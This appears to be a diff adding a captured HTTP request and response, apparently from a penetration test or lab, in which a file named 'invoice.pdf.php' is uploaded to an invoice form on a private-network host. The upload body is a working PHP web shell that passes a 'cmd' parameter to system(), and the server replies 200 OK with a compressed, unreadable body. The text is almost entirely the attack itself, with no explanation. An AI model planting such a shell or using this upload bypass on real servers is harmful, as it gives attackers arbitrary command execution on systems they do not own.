@@ -1,0 +1,55 @@
+POST /upload_invoice.php HTTP/1.1
+Host: 10.87.1.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------3462890043675597614044520244
+Content-Length: 672
+Origin: http://10.87.1.2
+Connection: keep-alive
+Referer: http://10.87.1.2/send_invoice.php
+Upgrade-Insecure-Requests: 1
+
+-----------------------------3462890043675597614044520244
+Content-Disposition: form-data; name="po_number"
+
+95729/test
+-----------------------------3462890043675597614044520244
+Content-Disposition: form-data; name="invoice_file"; filename="invoice.pdf.php"
+Content-Type: application/x-php
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+
+-----------------------------3462890043675597614044520244--
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 18:57:18 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 192
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+..........5.IN.1.E.>....@B(..
+d
+.\.bW......@n.	.}z.pq.].X....6.M..9.G........S9L......3m.1m.......[J'.....Q2......T..d....6....F.
+..u....<..G.W.n.*.....*.8...a~i.x.........g....k....}..
+......
